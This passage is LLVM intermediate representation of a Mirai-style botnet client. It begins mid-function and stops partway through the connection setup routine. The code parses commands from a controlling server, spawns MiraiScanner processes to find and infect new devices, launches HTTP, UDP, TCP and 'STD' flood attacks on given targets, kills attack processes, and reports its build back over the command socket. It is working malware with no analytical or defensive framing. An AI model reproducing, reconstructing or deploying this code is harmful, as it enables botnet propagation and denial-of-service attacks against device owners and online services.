  br i1 %143, label %232, label %144

; <label>:144:                                    ; preds = %138
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 1
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @strcmp(i8* %147, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i32 0, i32 0)) #9
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %195, label %150

; <label>:150:                                    ; preds = %144
  %151 = call i32 @fork() #5
  store i32 %151, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %152 = call i64 @sysconf(i32 84) #5
  %153 = trunc i64 %152 to i32
  store i32 %153, i32* %13, align 4
  store i32 999999, i32* %14, align 4
  %154 = load i32, i32* %13, align 4
  %155 = icmp eq i32 %154, 1
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %150
  store i32 500, i32* %14, align 4
  br label %157

; <label>:157:                                    ; preds = %156, %150
  %158 = load i32, i32* %13, align 4
  %159 = icmp sge i32 %158, 2
  br i1 %159, label %160, label %161

; <label>:160:                                    ; preds = %157
  store i32 1000, i32* %14, align 4
  br label %161

; <label>:161:                                    ; preds = %160, %157
  %162 = load i32, i32* %11, align 4
  %163 = icmp ugt i32 %162, 0
  br i1 %163, label %164, label %166

; <label>:164:                                    ; preds = %161
  %165 = load i32, i32* %11, align 4
  store i32 %165, i32* @scanPid, align 4
  br label %617

; <label>:166:                                    ; preds = %161
  %167 = load i32, i32* %11, align 4
  %168 = icmp eq i32 %167, -1
  br i1 %168, label %169, label %170

; <label>:169:                                    ; preds = %166
  br label %617

; <label>:170:                                    ; preds = %166
  br label %171

; <label>:171:                                    ; preds = %170
  store i32 0, i32* %12, align 4
  br label %172

; <label>:172:                                    ; preds = %191, %171
  %173 = load i32, i32* %12, align 4
  %174 = load i32, i32* %13, align 4
  %175 = icmp slt i32 %173, %174
  br i1 %175, label %176, label %194

; <label>:176:                                    ; preds = %172
  %177 = call i64 @time(i64* null) #5
  %178 = call i32 @getpid() #5
  %179 = sext i32 %178 to i64
  %180 = xor i64 %177, %179
  %181 = call i32 @getppid() #5
  %182 = sext i32 %181 to i64
  %183 = add nsw i64 %180, %182
  %184 = trunc i64 %183 to i32
  call void @srand(i32 %184) #5
  %185 = call i64 @time(i64* null) #5
  %186 = call i32 @getpid() #5
  %187 = sext i32 %186 to i64
  %188 = xor i64 %185, %187
  %189 = trunc i64 %188 to i32
  call void @init_rand(i32 %189)
  %190 = load i32, i32* %14, align 4
  call void @MiraiScanner(i32 100, i32 %190)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %192 = load i32, i32* %12, align 4
  %193 = add nsw i32 %192, 1
  store i32 %193, i32* %12, align 4
  br label %172

; <label>:194:                                    ; preds = %172
  br label %195

; <label>:195:                                    ; preds = %194, %144
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 1
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.550, i32 0, i32 0)) #9
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %208, label %201

; <label>:201:                                    ; preds = %195
  %202 = load i32, i32* @scanPid, align 4
  %203 = icmp eq i32 %202, 0
  br i1 %203, label %204, label %205

; <label>:204:                                    ; preds = %201
  br label %617

; <label>:205:                                    ; preds = %201
  %206 = load i32, i32* @scanPid, align 4
  %207 = call i32 @kill(i32 %206, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %208

; <label>:208:                                    ; preds = %205, %195
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 1
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @strcmp(i8* %211, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i32 0, i32 0)) #9
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %231, label %214

; <label>:214:                                    ; preds = %208
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 1
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #9
  store i32 %218, i32* %15, align 4
  %219 = load i8**, i8*** %4, align 8
  %220 = getelementptr inbounds i8*, i8** %219, i64 2
  %221 = load i8*, i8** %220, align 8
  %222 = call i32 @atoi(i8* %221) #9
  store i32 %222, i32* %16, align 4
  %223 = call i32 @listFork()
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %230, label %225

; <label>:225:                                    ; preds = %214
  %226 = load i32, i32* @mainCommSock, align 4
  %227 = call i32 (i32, i8*, ...) @sockprintf(i32 %226, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.554, i32 0, i32 0))
  %228 = load i32, i32* %16, align 4
  %229 = load i32, i32* %15, align 4
  call void @MiraiScanner(i32 %228, i32 %229)
  call void @_exit(i32 0) #11
  unreachable

; <label>:230:                                    ; preds = %214
  br label %617

; <label>:231:                                    ; preds = %208
  br label %232

; <label>:232:                                    ; preds = %231, %138
  %233 = load i8**, i8*** %4, align 8
  %234 = getelementptr inbounds i8*, i8** %233, i64 0
  %235 = load i8*, i8** %234, align 8
  %236 = call i32 @strcmp(i8* %235, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.555, i32 0, i32 0)) #9
  %237 = icmp ne i32 %236, 0
  br i1 %237, label %281, label %238

; <label>:238:                                    ; preds = %232
  %239 = load i32, i32* %3, align 4
  %240 = icmp slt i32 %239, 6
  br i1 %240, label %253, label %241

; <label>:241:                                    ; preds = %238
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 3
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #9
  %246 = icmp slt i32 %245, 1
  br i1 %246, label %253, label %247

; <label>:247:                                    ; preds = %241
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 5
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #9
  %252 = icmp slt i32 %251, 1
  br i1 %252, label %253, label %254

; <label>:253:                                    ; preds = %247, %241, %238
  br label %617

; <label>:254:                                    ; preds = %247
  %255 = call i32 @listFork()
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %257, label %258

; <label>:257:                                    ; preds = %254
  br label %617

; <label>:258:                                    ; preds = %254
  %259 = load i8**, i8*** %4, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 1
  %261 = load i8*, i8** %260, align 8
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 2
  %264 = load i8*, i8** %263, align 8
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 3
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @atoi(i8* %267) #9
  %269 = trunc i32 %268 to i16
  %270 = load i8**, i8*** %4, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 4
  %272 = load i8*, i8** %271, align 8
  %273 = load i8**, i8*** %4, align 8
  %274 = getelementptr inbounds i8*, i8** %273, i64 5
  %275 = load i8*, i8** %274, align 8
  %276 = call i32 @atoi(i8* %275) #9
  %277 = load i8**, i8*** %4, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 6
  %279 = load i8*, i8** %278, align 8
  %280 = call i32 @atoi(i8* %279) #9
  call void @SendHTTP(i8* %261, i8* %264, i16 zeroext %269, i8* %272, i32 %276, i32 %280)
  call void @exit(i32 0) #12
  unreachable

; <label>:281:                                    ; preds = %232
  %282 = load i8**, i8*** %4, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 0
  %284 = load i8*, i8** %283, align 8
  %285 = call i32 @strcmp(i8* %284, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.556, i32 0, i32 0)) #9
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %384, label %287

; <label>:287:                                    ; preds = %281
  %288 = load i32, i32* %3, align 4
  %289 = icmp slt i32 %288, 6
  br i1 %289, label %323, label %290

; <label>:290:                                    ; preds = %287
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 3
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @atoi(i8* %293) #9
  %295 = icmp eq i32 %294, -1
  br i1 %295, label %323, label %296

; <label>:296:                                    ; preds = %290
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 2
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 @atoi(i8* %299) #9
  %301 = icmp eq i32 %300, -1
  br i1 %301, label %323, label %302

; <label>:302:                                    ; preds = %296
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 4
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* %305) #9
  %307 = icmp eq i32 %306, -1
  br i1 %307, label %323, label %308

; <label>:308:                                    ; preds = %302
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 4
  %311 = load i8*, i8** %310, align 8
  %312 = call i32 @atoi(i8* %311) #9
  %313 = icmp sgt i32 %312, 1024
  br i1 %313, label %323, label %314

; <label>:314:                                    ; preds = %308
  %315 = load i32, i32* %3, align 4
  %316 = icmp eq i32 %315, 6
  br i1 %316, label %317, label %324

; <label>:317:                                    ; preds = %314
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds i8*, i8** %318, i64 5
  %320 = load i8*, i8** %319, align 8
  %321 = call i32 @atoi(i8* %320) #9
  %322 = icmp slt i32 %321, 1
  br i1 %322, label %323, label %324

; <label>:323:                                    ; preds = %317, %308, %302, %296, %290, %287
  br label %617

; <label>:324:                                    ; preds = %317, %314
  %325 = load i8**, i8*** %4, align 8
  %326 = getelementptr inbounds i8*, i8** %325, i64 1
  %327 = load i8*, i8** %326, align 8
  store i8* %327, i8** %17, align 8
  %328 = load i8**, i8*** %4, align 8
  %329 = getelementptr inbounds i8*, i8** %328, i64 2
  %330 = load i8*, i8** %329, align 8
  %331 = call i32 @atoi(i8* %330) #9
  store i32 %331, i32* %18, align 4
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 3
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #9
  store i32 %335, i32* %19, align 4
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 4
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* %338) #9
  store i32 %339, i32* %20, align 4
  %340 = load i32, i32* %3, align 4
  %341 = icmp eq i32 %340, 6
  br i1 %341, label %342, label %347

; <label>:342:                                    ; preds = %324
  %343 = load i8**, i8*** %4, align 8
  %344 = getelementptr inbounds i8*, i8** %343, i64 5
  %345 = load i8*, i8** %344, align 8
  %346 = call i32 @atoi(i8* %345) #9
  br label %348

; <label>:347:                                    ; preds = %324
  br label %348

; <label>:348:                                    ; preds = %347, %342
  %349 = phi i32 [ %346, %342 ], [ 10, %347 ]
  store i32 %349, i32* %21, align 4
  store i32 32, i32* %22, align 4
  %350 = load i8*, i8** %17, align 8
  %351 = call i8* @strstr(i8* %350, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %352 = icmp ne i8* %351, null
  br i1 %352, label %353, label %372

; <label>:353:                                    ; preds = %348
  %354 = load i8*, i8** %17, align 8
  %355 = call i8* @strtok(i8* %354, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %355, i8** %23, align 8
  br label %356

; <label>:356:                                    ; preds = %369, %353
  %357 = load i8*, i8** %23, align 8
  %358 = icmp ne i8* %357, null
  br i1 %358, label %359, label %371

; <label>:359:                                    ; preds = %356
  %360 = call i32 @listFork()
  %361 = icmp ne i32 %360, 0
  br i1 %361, label %369, label %362

; <label>:362:                                    ; preds = %359
  %363 = load i8*, i8** %23, align 8
  %364 = load i32, i32* %18, align 4
  %365 = load i32, i32* %19, align 4
  %366 = load i32, i32* %20, align 4
  %367 = load i32, i32* %21, align 4
  %368 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %363, i32 %364, i32 %365, i32 %366, i32 %367, i32 %368)
  call void @_exit(i32 0) #11
  unreachable

; <label>:369:                                    ; preds = %359
  %370 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %370, i8** %23, align 8
  br label %356

; <label>:371:                                    ; preds = %356
  br label %383

; <label>:372:                                    ; preds = %348
  %373 = call i32 @listFork()
  %374 = icmp ne i32 %373, 0
  br i1 %374, label %375, label %376

; <label>:375:                                    ; preds = %372
  br label %617

; <label>:376:                                    ; preds = %372
  %377 = load i8*, i8** %17, align 8
  %378 = load i32, i32* %18, align 4
  %379 = load i32, i32* %19, align 4
  %380 = load i32, i32* %20, align 4
  %381 = load i32, i32* %21, align 4
  %382 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %377, i32 %378, i32 %379, i32 %380, i32 %381, i32 %382)
  call void @_exit(i32 0) #11
  unreachable

; <label>:383:                                    ; preds = %371
  br label %384

; <label>:384:                                    ; preds = %383, %281
  %385 = load i8**, i8*** %4, align 8
  %386 = getelementptr inbounds i8*, i8** %385, i64 0
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @strcmp(i8* %387, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.557, i32 0, i32 0)) #9
  %389 = icmp ne i32 %388, 0
  br i1 %389, label %495, label %390

; <label>:390:                                    ; preds = %384
  %391 = load i32, i32* %3, align 4
  %392 = icmp slt i32 %391, 6
  br i1 %392, label %423, label %393

; <label>:393:                                    ; preds = %390
  %394 = load i8**, i8*** %4, align 8
  %395 = getelementptr inbounds i8*, i8** %394, i64 3
  %396 = load i8*, i8** %395, align 8
  %397 = call i32 @atoi(i8* %396) #9
  %398 = icmp eq i32 %397, -1
  br i1 %398, label %423, label %399

; <label>:399:                                    ; preds = %393
  %400 = load i8**, i8*** %4, align 8
  %401 = getelementptr inbounds i8*, i8** %400, i64 2
  %402 = load i8*, i8** %401, align 8
  %403 = call i32 @atoi(i8* %402) #9
  %404 = icmp eq i32 %403, -1
  br i1 %404, label %423, label %405

; <label>:405:                                    ; preds = %399
  %406 = load i32, i32* %3, align 4
  %407 = icmp sgt i32 %406, 5
  br i1 %407, label %408, label %414

; <label>:408:                                    ; preds = %405
  %409 = load i8**, i8*** %4, align 8
  %410 = getelementptr inbounds i8*, i8** %409, i64 5
  %411 = load i8*, i8** %410, align 8
  %412 = call i32 @atoi(i8* %411) #9
  %413 = icmp slt i32 %412, 0
  br i1 %413, label %423, label %414

; <label>:414:                                    ; preds = %408, %405
  %415 = load i32, i32* %3, align 4
  %416 = icmp eq i32 %415, 7
  br i1 %416, label %417, label %424

; <label>:417:                                    ; preds = %414
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 6
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @atoi(i8* %420) #9
  %422 = icmp slt i32 %421, 1
  br i1 %422, label %423, label %424

; <label>:423:                                    ; preds = %417, %408, %399, %393, %390
  br label %617

; <label>:424:                                    ; preds = %417, %414
  %425 = load i8**, i8*** %4, align 8
  %426 = getelementptr inbounds i8*, i8** %425, i64 1
  %427 = load i8*, i8** %426, align 8
  store i8* %427, i8** %24, align 8
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 2
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @atoi(i8* %430) #9
  store i32 %431, i32* %25, align 4
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 3
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #9
  store i32 %435, i32* %26, align 4
  %436 = load i8**, i8*** %4, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 4
  %438 = load i8*, i8** %437, align 8
  store i8* %438, i8** %27, align 8
  %439 = load i32, i32* %3, align 4
  %440 = icmp eq i32 %439, 7
  br i1 %440, label %441, label %446

; <label>:441:                                    ; preds = %424
  %442 = load i8**, i8*** %4, align 8
  %443 = getelementptr inbounds i8*, i8** %442, i64 6
  %444 = load i8*, i8** %443, align 8
  %445 = call i32 @atoi(i8* %444) #9
  br label %447

; <label>:446:                                    ; preds = %424
  br label %447

; <label>:447:                                    ; preds = %446, %441
  %448 = phi i32 [ %445, %441 ], [ 10, %446 ]
  store i32 %448, i32* %28, align 4
  %449 = load i32, i32* %3, align 4
  %450 = icmp sgt i32 %449, 5
  br i1 %450, label %451, label %456

; <label>:451:                                    ; preds = %447
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 5
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @atoi(i8* %454) #9
  br label %457

; <label>:456:                                    ; preds = %447
  br label %457

; <label>:457:                                    ; preds = %456, %451
  %458 = phi i32 [ %455, %451 ], [ 0, %456 ]
  store i32 %458, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %459 = load i8*, i8** %24, align 8
  %460 = call i8* @strstr(i8* %459, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %461 = icmp ne i8* %460, null
  br i1 %461, label %462, label %482

; <label>:462:                                    ; preds = %457
  %463 = load i8*, i8** %24, align 8
  %464 = call i8* @strtok(i8* %463, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %464, i8** %31, align 8
  br label %465

; <label>:465:                                    ; preds = %479, %462
  %466 = load i8*, i8** %31, align 8
  %467 = icmp ne i8* %466, null
  br i1 %467, label %468, label %481

; <label>:468:                                    ; preds = %465
  %469 = call i32 @listFork()
  %470 = icmp ne i32 %469, 0
  br i1 %470, label %479, label %471

; <label>:471:                                    ; preds = %468
  %472 = load i8*, i8** %31, align 8
  %473 = load i32, i32* %25, align 4
  %474 = load i32, i32* %26, align 4
  %475 = load i8*, i8** %27, align 8
  %476 = load i32, i32* %29, align 4
  %477 = load i32, i32* %28, align 4
  %478 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %472, i32 %473, i32 %474, i8* %475, i32 %476, i32 %477, i32 %478)
  call void @_exit(i32 0) #11
  unreachable

; <label>:479:                                    ; preds = %468
  %480 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %480, i8** %31, align 8
  br label %465

; <label>:481:                                    ; preds = %465
  br label %494

; <label>:482:                                    ; preds = %457
  %483 = call i32 @listFork()
  %484 = icmp ne i32 %483, 0
  br i1 %484, label %485, label %486

; <label>:485:                                    ; preds = %482
  br label %617

; <label>:486:                                    ; preds = %482
  %487 = load i8*, i8** %24, align 8
  %488 = load i32, i32* %25, align 4
  %489 = load i32, i32* %26, align 4
  %490 = load i8*, i8** %27, align 8
  %491 = load i32, i32* %29, align 4
  %492 = load i32, i32* %28, align 4
  %493 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %487, i32 %488, i32 %489, i8* %490, i32 %491, i32 %492, i32 %493)
  call void @_exit(i32 0) #11
  unreachable

; <label>:494:                                    ; preds = %481
  br label %495

; <label>:495:                                    ; preds = %494, %384
  %496 = load i8**, i8*** %4, align 8
  %497 = getelementptr inbounds i8*, i8** %496, i64 0
  %498 = load i8*, i8** %497, align 8
  %499 = call i32 @strcmp(i8* %498, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.558, i32 0, i32 0)) #9
  %500 = icmp ne i32 %499, 0
  br i1 %500, label %557, label %501

; <label>:501:                                    ; preds = %495
  %502 = load i32, i32* %3, align 4
  %503 = icmp slt i32 %502, 4
  br i1 %503, label %516, label %504

; <label>:504:                                    ; preds = %501
  %505 = load i8**, i8*** %4, align 8
  %506 = getelementptr inbounds i8*, i8** %505, i64 2
  %507 = load i8*, i8** %506, align 8
  %508 = call i32 @atoi(i8* %507) #9
  %509 = icmp slt i32 %508, 1
  br i1 %509, label %516, label %510

; <label>:510:                                    ; preds = %504
  %511 = load i8**, i8*** %4, align 8
  %512 = getelementptr inbounds i8*, i8** %511, i64 3
  %513 = load i8*, i8** %512, align 8
  %514 = call i32 @atoi(i8* %513) #9
  %515 = icmp slt i32 %514, 1
  br i1 %515, label %516, label %517

; <label>:516:                                    ; preds = %510, %504, %501
  br label %617

; <label>:517:                                    ; preds = %510
  %518 = load i8**, i8*** %4, align 8
  %519 = getelementptr inbounds i8*, i8** %518, i64 1
  %520 = load i8*, i8** %519, align 8
  store i8* %520, i8** %32, align 8
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 2
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #9
  store i32 %524, i32* %33, align 4
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 3
  %527 = load i8*, i8** %526, align 8
  %528 = call i32 @atoi(i8* %527) #9
  store i32 %528, i32* %34, align 4
  %529 = load i8*, i8** %32, align 8
  %530 = call i8* @strstr(i8* %529, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %531 = icmp ne i8* %530, null
  br i1 %531, label %532, label %548

; <label>:532:                                    ; preds = %517
  %533 = load i8*, i8** %32, align 8
  %534 = call i8* @strtok(i8* %533, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %534, i8** %35, align 8
  br label %535

; <label>:535:                                    ; preds = %545, %532
  %536 = load i8*, i8** %35, align 8
  %537 = icmp ne i8* %536, null
  br i1 %537, label %538, label %547

; <label>:538:                                    ; preds = %535
  %539 = call i32 @listFork()
  %540 = icmp ne i32 %539, 0
  br i1 %540, label %545, label %541

; <label>:541:                                    ; preds = %538
  %542 = load i8*, i8** %35, align 8
  %543 = load i32, i32* %33, align 4
  %544 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %542, i32 %543, i32 %544)
  call void @_exit(i32 0) #11
  unreachable

; <label>:545:                                    ; preds = %538
  %546 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %546, i8** %35, align 8
  br label %535

; <label>:547:                                    ; preds = %535
  br label %556

; <label>:548:                                    ; preds = %517
  %549 = call i32 @listFork()
  %550 = icmp ne i32 %549, 0
  br i1 %550, label %551, label %552

; <label>:551:                                    ; preds = %548
  br label %617

; <label>:552:                                    ; preds = %548
  %553 = load i8*, i8** %32, align 8
  %554 = load i32, i32* %33, align 4
  %555 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %553, i32 %554, i32 %555)
  call void @_exit(i32 0) #11
  unreachable

; <label>:556:                                    ; preds = %547
  br label %557

; <label>:557:                                    ; preds = %556, %495
  %558 = load i8**, i8*** %4, align 8
  %559 = getelementptr inbounds i8*, i8** %558, i64 0
  %560 = load i8*, i8** %559, align 8
  %561 = call i32 @strcmp(i8* %560, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.559, i32 0, i32 0)) #9
  %562 = icmp ne i32 %561, 0
  br i1 %562, label %599, label %563

; <label>:563:                                    ; preds = %557
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %564

; <label>:564:                                    ; preds = %590, %563
  %565 = load i64, i64* %37, align 8
  %566 = load i64, i64* @numpids, align 8
  %567 = icmp ult i64 %565, %566
  br i1 %567, label %568, label %593

; <label>:568:                                    ; preds = %564
  %569 = load i32*, i32** @pids, align 8
  %570 = load i64, i64* %37, align 8
  %571 = getelementptr inbounds i32, i32* %569, i64 %570
  %572 = load i32, i32* %571, align 4
  %573 = icmp ne i32 %572, 0
  br i1 %573, label %574, label %589

; <label>:574:                                    ; preds = %568
  %575 = load i32*, i32** @pids, align 8
  %576 = load i64, i64* %37, align 8
  %577 = getelementptr inbounds i32, i32* %575, i64 %576
  %578 = load i32, i32* %577, align 4
  %579 = call i32 @getpid() #5
  %580 = icmp ne i32 %578, %579
  br i1 %580, label %581, label %589

; <label>:581:                                    ; preds = %574
  %582 = load i32*, i32** @pids, align 8
  %583 = load i64, i64* %37, align 8
  %584 = getelementptr inbounds i32, i32* %582, i64 %583
  %585 = load i32, i32* %584, align 4
  %586 = call i32 @kill(i32 %585, i32 9) #5
  %587 = load i32, i32* %36, align 4
  %588 = add nsw i32 %587, 1
  store i32 %588, i32* %36, align 4
  br label %589

; <label>:589:                                    ; preds = %581, %574, %568
  br label %590

; <label>:590:                                    ; preds = %589
  %591 = load i64, i64* %37, align 8
  %592 = add i64 %591, 1
  store i64 %592, i64* %37, align 8
  br label %564

; <label>:593:                                    ; preds = %564
  %594 = load i32, i32* %36, align 4
  %595 = icmp sgt i32 %594, 0
  br i1 %595, label %596, label %597

; <label>:596:                                    ; preds = %593
  br label %598

; <label>:597:                                    ; preds = %593
  br label %598

; <label>:598:                                    ; preds = %597, %596
  br label %599

; <label>:599:                                    ; preds = %598, %557
  %600 = load i8**, i8*** %4, align 8
  %601 = getelementptr inbounds i8*, i8** %600, i64 0
  %602 = load i8*, i8** %601, align 8
  %603 = call i32 @strcmp(i8* %602, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.560, i32 0, i32 0)) #9
  %604 = icmp ne i32 %603, 0
  br i1 %604, label %606, label %605

; <label>:605:                                    ; preds = %599
  call void @exit(i32 0) #12
  unreachable

; <label>:606:                                    ; preds = %599
  %607 = load i8**, i8*** %4, align 8
  %608 = getelementptr inbounds i8*, i8** %607, i64 0
  %609 = load i8*, i8** %608, align 8
  %610 = call i32 @strcmp(i8* %609, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.561, i32 0, i32 0)) #9
  %611 = icmp ne i32 %610, 0
  br i1 %611, label %617, label %612

; <label>:612:                                    ; preds = %606
  call void @RemoveTempDirs()
  %613 = load i32, i32* @mainCommSock, align 4
  %614 = call i8* @getBuild()
  %615 = call i32 @getEndianness()
  %616 = call i32 (i32, i8*, ...) @sockprintf(i32 %613, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.562, i32 0, i32 0), i8* %614, i32 %615)
  br label %617

; <label>:617:                                    ; preds = %612, %606, %551, %516, %485, %423, %375, %323, %257, %253, %230, %204, %169, %164, %136, %110, %75, %70, %43
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.565 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.566 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.567 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.568 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.569 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
